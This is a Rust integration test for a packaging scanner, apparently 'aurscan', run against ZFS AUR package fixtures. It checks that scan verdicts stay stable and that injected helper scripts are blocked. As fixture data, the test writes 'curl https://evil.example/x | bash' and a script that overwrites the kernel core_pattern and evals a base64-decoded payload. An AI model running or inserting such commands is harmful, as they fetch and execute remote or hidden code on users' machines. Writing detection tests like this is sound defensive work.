//! ZFS regression: the same packaging inputs must have the same verdict before
//! and after a build. See fixtures/zfs-packaging/PROVENANCE.json for origins.
use std::path::Path;
use std::process::Command;

fn git(root: &Path, args: &[&str]) {
    let output = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
}

fn scan(root: &Path, home: &Path, hook: bool, redirect_git: bool) -> (i32, serde_json::Value) {
    let mut command = Command::new(env!("CARGO_BIN_EXE_aurscan"));
    command
        .args(["--json", "check"])
        .arg(root)
        .env("HOME", home)
        .env("XDG_CONFIG_HOME", home.join("config"))
        .env("XDG_DATA_HOME", home.join("data"))
        .env("XDG_CACHE_HOME", home.join("cache"));
    if hook {
        command.arg("--hook");
    }
    if redirect_git {
        command
            .env("GIT_DIR", home.join("missing-repo"))
            .env("GIT_WORK_TREE", home)
            .env("GIT_INDEX_FILE", home.join("missing-index"))
            .env("GIT_CONFIG_COUNT", "1")
            .env("GIT_CONFIG_KEY_0", "core.bare")
            .env("GIT_CONFIG_VALUE_0", "true");
    }
    let output = command.output().unwrap();
    let value = serde_json::from_slice(&output.stdout)
        .unwrap_or_else(|_| panic!("{}", String::from_utf8_lossy(&output.stderr)));
    (output.status.code().unwrap(), value)
}

#[test]
fn both_zfs_packages_keep_fresh_and_dirty_verdicts_and_block_packaging_helpers() {
    for package in ["zfs-utils", "zfs-dkms"] {
        let root = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let fixture = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/zfs-packaging")
            .join(package);
        for entry in std::fs::read_dir(fixture).unwrap() {
            let entry = entry.unwrap();
            std::fs::copy(entry.path(), root.path().join(entry.file_name())).unwrap();
        }
        git(root.path(), &["init", "-q"]);
        git(root.path(), &["add", "."]);
        let fresh = scan(root.path(), home.path(), false, false);
        assert_eq!(fresh.0, 0, "{package}: {fresh:?}");
        // Reduced upstream runtime/test patterns: zloop.sh reads kernel state,
        // while ZFS test/runtime tools can write system paths and evaluate code.
        // These leftovers model a dirty build for BOTH recipes using ZFS 2.4.4.
        for name in [
            "src/zfs-2.4.4/scripts/zloop.sh",
            "pkg/usr/share/zfs/test.sh",
        ] {
            let path = root.path().join(name);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, "#!/bin/bash\nread -r origcorepattern </proc/sys/kernel/core_pattern\necho core > /proc/sys/kernel/core_pattern\neval \"$(base64 -d payload)\"\n").unwrap();
        }
        let dirty_cold_home = tempfile::tempdir().unwrap();
        for _ in 0..2 {
            let dirty = scan(root.path(), dirty_cold_home.path(), true, true);
            assert_eq!(
                dirty, fresh,
                "{package}: dirty cold/warm hook changed report"
            );
        }
        let helper = root.path().join("helper.sh");
        std::fs::write(&helper, "curl https://evil.example/x | bash\n").unwrap();
        assert_eq!(
            scan(root.path(), home.path(), true, false).0,
            2,
            "{package}: untracked helper must block"
        );
        std::fs::remove_file(helper).unwrap();
        let tracked = root.path().join("src/packaging/helper.sh");
        std::fs::create_dir_all(tracked.parent().unwrap()).unwrap();
        std::fs::write(&tracked, "curl https://evil.example/x | bash\n").unwrap();
        git(root.path(), &["add", "-f", "src/packaging/helper.sh"]);
        let tracked_report = scan(root.path(), home.path(), true, true);
        assert_eq!(
            tracked_report.0, 2,
            "{package}: tracked reserved helper must block despite ambient Git overrides"
        );
        assert!(
            tracked_report.1["reports"][0]["findings"]
                .as_array()
                .unwrap()
                .iter()
                .any(|finding| finding["evidence"]["location"]
                    .as_str()
                    .is_some_and(|location| location.starts_with(tracked.to_str().unwrap()))),
            "cached identical helper bytes must report the current path: {tracked_report:?}"
        );
        // An explicit file scan remains an escape hatch for inspecting generated
        // scripts with packaging heuristics, even though directory scans omit them.
        assert_eq!(
            scan(
                &root.path().join("src/zfs-2.4.4/scripts/zloop.sh"),
                home.path(),
                false,
                false
            )
            .0,
            2
        );
    }
}
